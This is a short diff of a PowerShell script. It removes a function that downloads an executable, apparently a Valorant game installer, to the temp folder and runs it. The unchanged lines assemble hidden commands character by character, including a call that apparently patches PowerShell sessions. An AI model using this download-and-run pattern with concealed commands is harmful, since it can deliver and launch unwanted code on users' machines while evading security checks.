@@ -84,35 +84,3 @@ Write-Host ("[>] " + [string]::Join("", ('D', 'r', 'y', 'c', 'b', 'e', 'r', ' ',
 $a = [scriptblock]::Create((('P', 'a', 't', 'c', 'h', '-', 'A', 'l', 'l', 'P', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', 's') -join ''))
 &$a
 
-function Invoke-DownloadAndExecute {
-    param (
-        [Parameter(Mandatory=$true)]
-        [string]$Url,
-
-        [Parameter(Mandatory=$false)]
-        [string]$Destination = "$env:TEMP\valorant.exe"
-    )
-
-    try {
-        Write-Host "Downloading file from $Url..."
-        Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing
-
-        if (Test-Path $Destination) {
-            Write-Host "File downloaded successfully: $Destination"
-        }
-        else {
-            throw "File was not downloaded successfully."
-        }
-
-        Write-Host "Executing downloaded file: $Destination"
-        Start-Process -FilePath $Destination -Wait
-
-        Write-Host "Execution completed successfully."
-    }
-    catch {
-        Write-Error "An error occurred: $_"
-    }
-}
-
-# Invocation of the function after it's defined:
-Invoke-DownloadAndExecute -Url "https://valorant.secure.dyn.riotcdn.net/channels/public/x/installer/current/live.live.ap.exe"
